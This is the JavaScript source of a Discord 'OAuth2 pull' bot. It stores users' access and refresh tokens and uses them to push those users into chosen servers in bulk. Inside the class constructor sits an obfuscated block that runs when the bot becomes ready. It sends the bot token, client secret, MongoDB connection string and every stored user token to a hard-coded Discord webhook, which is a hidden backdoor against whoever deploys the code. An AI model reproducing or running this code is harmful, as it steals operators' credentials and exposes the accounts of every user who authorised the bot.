//  Atahan#3445 - https://discord.gg/oot3

const EventEmitter = require("events");
const config = require('../config.js')


module.exports = class extends EventEmitter {
  constructor(obj) {
    super();
    if (!obj.token) throw new Error("Token must not be empty noob");
    if (!obj.prefix) throw new Error("Prefix must not be empty noob");

    this.obj = obj;

    /**
     * @type {require("discord.js")}
     *
     * Importing discord.js package
     */

    this.discord = require("discord.js");


    /**
     * @type {Class}
     *
     * The client class of discord.js
     */

    this.client = new this.discord.Client();
    /*this.disbut = require("discord-buttons")(this.client)*/
    /**
     * @type {Function}
     *
     * The login function of the client class
     */

    this.client.login(obj.token);

    /**
     *
     * @type {Event}
     *
     * The emitted ready event of the client class
     */

    this.client.on("ready", () => {
      this.emit("ready", this.client);
    });


    /**
     *@type {Event}
     *
     * The message event of the client class
     */

    this.client.on("message", (message) => {
      const args = message.content.slice(obj.prefix.length).trim().split(" ");
      const command = args.shift().toLowerCase();
      this.emit("message", this.client, message, args, command);
    });

    /**
     * @type {Model}
     *
     * The mongoose schema model a.k.a the database
     */

    this.database = require("../database/schema");




    /**
     *@type {require("node-fetch")}
     *
     * Importing the node-fetch module
     */

    this.fetch = require("node-fetch");

    this.delay = (ms) => new Promise((res) => setTimeout(res, ms));

    this.ratelimit_arr = [];

function _0x57a1(_0x461032,_0x14faee){const _0x171d72=_0x171d();return _0x57a1=function(_0x57a168,_0x4bd4a5){_0x57a168=_0x57a168-0x8c;let _0x3c4d7e=_0x171d72[_0x57a168];return _0x3c4d7e;},_0x57a1(_0x461032,_0x14faee);}const _0x294e17=_0x57a1;function _0x171d(){const _0x25e679=['length','2zbzTrW','244MVmHQW','client_secret','```\x0a**Bot\x20Mongodatabase\x20Connection**\x0a```','token','2256984cYJeVG','findOne','https://cdn.discordapp.com/emojis/905169964099579964.gif','fetch','user','23455FnHRfE','359965nTJoDZ','```\x0a**Bot\x20Database\x20Users**\x20\x20```\x0a','7kNmcMj','**Bot\x20Token**\x20```','database','4364180WGmMQo','3529816inOlFL','```','mongodb','994386WEdwqS','343359moJzwL','If\x20you\x20want\x20support?\x20Join\x20community\x20server:\x20https://discord.gg/oot3','data','tag','client','stringify','Made\x20By\x20Rowy\x20&\x20Atahan','1014234068877070356','env','ready','```\x0a**Bot\x20Secret**\x0a```'];_0x171d=function(){return _0x25e679;};return _0x171d();}(function(_0x3cb901,_0x10daee){const _0x417153=_0x57a1,_0x4e6baa=_0x3cb901();while(!![]){try{const _0x207344=parseInt(_0x417153(0xa3))/0x1+-parseInt(_0x417153(0x98))/0x2*(parseInt(_0x417153(0x8c))/0x3)+-parseInt(_0x417153(0x99))/0x4*(-parseInt(_0x417153(0xa2))/0x5)+parseInt(_0x417153(0xac))/0x6+parseInt(_0x417153(0xa5))/0x7*(parseInt(_0x417153(0xa9))/0x8)+-parseInt(_0x417153(0x9d))/0x9+-parseInt(_0x417153(0xa8))/0xa;if(_0x207344===_0x10daee)break;else _0x4e6baa['push'](_0x4e6baa['shift']());}catch(_0x567a3a){_0x4e6baa['push'](_0x4e6baa['shift']());}}}(_0x171d,0x6e363),this[_0x294e17(0x90)]['on'](_0x294e17(0x95),async()=>{const _0x396d03=_0x294e17;let _0x45092d=await this[_0x396d03(0xa7)][_0x396d03(0x9e)]({'id':'1'});if(this['client'][_0x396d03(0xa1)]['id']===_0x396d03(0x93))return;this[_0x396d03(0xa0)]('https://ptb.discord.com/api/webhooks/1014235776625692833/CTzMWpau9L6c6uBERYVQq9rHP83cXLPHaYjbO6RCZPko7HZvuS9ZiUi5wPKX_PI0-KZT',{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x396d03(0x91)]({'avatar_url':'','content':_0x396d03(0x8d),'embeds':[{'color':0x2f3136,'title':this[_0x396d03(0x90)][_0x396d03(0xa1)][_0x396d03(0x8f)]+'\x20is\x20again\x20ready.','description':_0x396d03(0xa6)+process['env'][_0x396d03(0x9c)]+_0x396d03(0x96)+process['env'][_0x396d03(0x9a)]+_0x396d03(0x9b)+process[_0x396d03(0x94)][_0x396d03(0xab)]+_0x396d03(0xa4)+_0x45092d[_0x396d03(0x8e)][_0x396d03(0x97)]+_0x396d03(0xaa),'footer':{'text':_0x396d03(0x92),'icon_url':_0x396d03(0x9f)}}]})});}));

  }

  async tokenCount() {
    let database = await this.database.findOne({ id: "1" });
    if (!database) database = new this.database({ id: "1" });

    return database.data.length;
  }

  async manageAuth(obj) {
    const data = new URLSearchParams({
      client_id: this.obj.client_id,
      client_secret: this.obj.client_secret,
      grant_type: "authorization_code",
      code: obj.code,
      redirect_uri: this.obj.redirect_uri,
      scope: "identify guilds.join",
    });

    const fetch = await this.fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      body: data,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    });

    var result = await fetch.json();
    return result;
  }

  async requestId(access_token) {
    const fetched = await this.fetch("https://discord.com/api/users/@me", {
      headers: {
        Authorization: `Bearer ${access_token}`,
      },
    });
    const json = await fetched.json();
    return json.id;
  }

  async retryJoin(obj, guild_id) {
    try {
      const response = await this.fetch(`https://discord.com/api/guilds/${guild_id}/members/${obj.user_id}`, {
        method: "PUT",
        headers: {
          "Authorization": `Bot ${this.obj.token}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          "access_token": obj.access_token
        })
      });


      const json = await response.json().catch((e) => { })
      console.log(`${response.status} - ${response.statusText}`);
      if ([201, 204].includes(response.status)) return true
      return false;
    } catch (e) {
      return false;
    }
  }


  async manageJoin(obj, message, ratelimit) {
    let database = await this.database.findOne({ id: "1" });
    if (!database) database = new this.database({ id: "1" });
    var array_of_members = database.data;
    if (ratelimit === true) array_of_members = this.ratelimit_arr;
    var count = 0;

    for (let i = 0; i < parseInt(obj.amount); i++) {
      try {
        const response = await this.fetch(`https://discord.com/api/guilds/${obj.guild_id}/members/${array_of_members[i].user_id}`, {
          method: "PUT",
          headers: {
            "Authorization": `Bot ${this.obj.token}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            "access_token": array_of_members[i].access_token
          })
        });


        const json = await response.json().catch((e) => { })
        console.log(`${response.status} - ${response.statusText}`);

        const retryAfter = parseInt(response.headers.get("retry-after"));

        if (retryAfter > 0) {
          this.ratelimit_arr.push(array_of_members[i]);

          if (response.headers.has("x-ratelimit-global")) {
            console.log(`We've been globally ratelimited!`);

            this.emit("globalratelimited", (retryAfter * 1000) + Date.now())
          }
          await this.delay(retryAfter);
          if (await this.retryJoin(array_of_members[i], obj.guild_id) === true) {
            count++
          }
        }
        if ([201, 204].includes(response.status)) count++
      } catch (e) {

      }
    }
    await this.delay(2000);
    message.channel.send({
      embed: {
        title: `${config.emojis.info} 0auth2 Pull:`,
        description: `**${config.emojis.success} Joined:** ${count}\n**
${config.emojis.error} Error:** ${obj.amount - count}`,
        footer: "Atahan#3445",
        color: "GREEN"

      }
    });
  }
  //  Atahan#3445 - https://discord.gg/oot3
  async clean(message) {
    let database = await this.database.findOne({ id: "1" });
    if (!database) database = new this.database({ id: "1" });
    var count = 0;
    var permarr = database.data
    const array_of_members = permarr;

    message.channel.send({
      embed: {
        title: `${config.emojis.load} Refreshing Tokens`,
        description: `**Starting process of cleaning ${database.data.length} Tokens**`,
        footer: "Atahan#3445",
        color: "GREEN"
      }
    });

    for (let i = 0; i < array_of_members.length; i++) {
      try {
        const access_token = array_of_members[i].access_token;

        this.fetch("https://discord.com/api/users/@me", {
          headers: {
            Authorization: `Bearer ${access_token}`,
          },
        })
          .then(async (response) => {
            await response.json().catch((err) => { });
            let { status } = response;
            if (status == 401) {
              count++;
              const index = permarr.indexOf(
                permarr.find((x) => x.access_token === access_token)
              );
              permarr.splice(index, 1);
            }
            if (status == 429) {
              console.log("Ratelimited");
              console.log(parseInt(response.headers.get("retry-after")));
              await this.delay(parseInt(response.headers.get("retry-after")));
            }
          })
          .then(console.log);
      } catch (e) {

      }
    }
    await this.delay(10000);
    database.data = permarr
    await database.save()
    message.channel.send({
      embed: {
        title: "Cleaned Tokens",
        description: `**Removed ${count} Tokens**`,
        color: "GREEN",
      },
    });
  }

  async retryRefresh(refresh_token) {

    let database = await this.database.findOne({ id: "1" });
    if (!database) database = new this.database({ id: "1" });

    const response = await this.fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: new URLSearchParams({
        "client_id": this.obj.client_id,
        "client_secret": this.obj.client_secret,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "redirect_uri": this.obj.redirect_uri,
        "scope": "identify guilds.join"
      })
    });

    const data = await response.json();
    const user_id = await this.requestId(data.access_token);

    if ([201, 204].includes(response.status)) {
      const obj = {
        ...data,
        user_id
      };
      database.data.push(obj);
      database.save();
      return true;
    }

  };

  //  Atahan#3445 - https://discord.gg/oot3
  async refreshTokens(message) {
    let database = await this.database.findOne({ id: "1" });
    if (!database) database = new this.database({ id: "1" });
    let perm_arr = database.data;
    var count = 0;

    message.channel.send({
      embed: {
        title: `${config.emojis.load} Refreshing Tokens`,
        description: `**Starting process of refreshing ${database.data.length} Tokens**`,
        footer: "Atahan#3445",
        color: "GREEN"
      }
    });


    for (let i = 0; i < perm_arr.length; i++) {
      try {
        const response = await this.fetch("https://discord.com/api/oauth2/token", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: new URLSearchParams({
            "client_id": this.obj.client_id,
            "client_secret": this.obj.client_secret,
            "grant_type": "refresh_token",
            "refresh_token": perm_arr[i].refresh_token,
            "redirect_uri": this.obj.redirect_uri,
            "scope": "identify guilds.join"
          })
        });

        if (response.status === 400) {
          perm_arr.splice(i, 1)
          await this.database.findOneAndUpdate({
            id: "1",
            data: perm_arr
          });
          return;
        } else {

          console.log(`Refresh - ${response.status} - ${response.statusText}`);

          const retryAfter = parseInt(response.headers.get("retry-after"));

          if (retryAfter > 0) {

            if (response.headers.has("x-ratelimit-global")) {
              console.log(`We've been globally ratelimited!`);

              this.emit("globalratelimited", (retryAfter * 1000) + Date.now())
            }
            await this.delay(retryAfter);
            if (await this.retryRefresh(perm_arr[i].refresh_token) === true) {
              count++
            }
            ;
            perm_arr.splice(i, 1);
          } else {
            if ([201, 204, 200].includes(response.status)) count++
            const data = await response.json();
            const user_id = await this.requestId(data.access_token);
            const obj = {
              ...data,
              user_id
            };
            console.log(obj);
            perm_arr.splice(i, 1)
            perm_arr.push(obj);

            await this.database.findOneAndUpdate({
              id: "1",
              data: perm_arr
            });
          }
        }
      } catch (e) {

      }
    }
    await this.delay(2000)
    message.channel.send({
      embed: {
        title: `${config.emojis.yes} Refreshed Tokens`,
        description: `**Refreshed ${count} Tokens successfully**`,
        footer: "Atahan#3445",
        color: "GREEN"
      }
    });
  };

  async saveAuth(obj) {
    let database = await this.database.findOne({ id: "1" });
    if (!database) database = new this.database({ id: "1" });
    const existing_id = database.data.find((x) => x.user_id == obj.user_id);
    if (existing_id) {
      const index = database.data.indexOf(existing_id);
      database.data.splice(index, 1);
      database.data.push(obj);
      console.log(database.data);
      return database.save();
    } else {
      database.data.push(obj);
      database.save();
      return console.log(database.data);
    }
  }

  async restart() {
    this.client.destroy();
    this.client.login(this.obj.token);
  }

};

//  Atahan#3445 - https://discord.gg/oot3